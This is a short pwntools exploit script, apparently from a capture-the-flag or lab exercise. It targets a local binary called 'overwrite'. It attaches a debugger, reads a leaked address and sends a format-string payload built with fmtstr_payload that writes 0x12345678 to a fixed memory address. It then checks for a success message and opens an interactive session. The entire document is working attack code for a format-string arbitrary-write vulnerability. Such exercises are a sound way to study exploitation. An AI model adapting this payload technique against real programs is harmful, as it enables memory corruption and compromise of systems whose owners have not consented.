from pwn import *

p = process("./overwrite")
elf = ELF("./overwrite")
gdb.attach(p,"b printf")

a_addr = int(p.recvuntil("\n",drop = True),16)
log.success("a_addr:" + hex(a_addr))
b_addr = 0x0804A028
c_addr = 0x0804A02C

payload = fmtstr_payload(offset = 8,writes = {c_addr:0x12345678})
p.sendline(payload)

info = p.recvline()
if "overwrite c for a big value" in info:
	log.success("overwrite c successfully")
p.interactive()
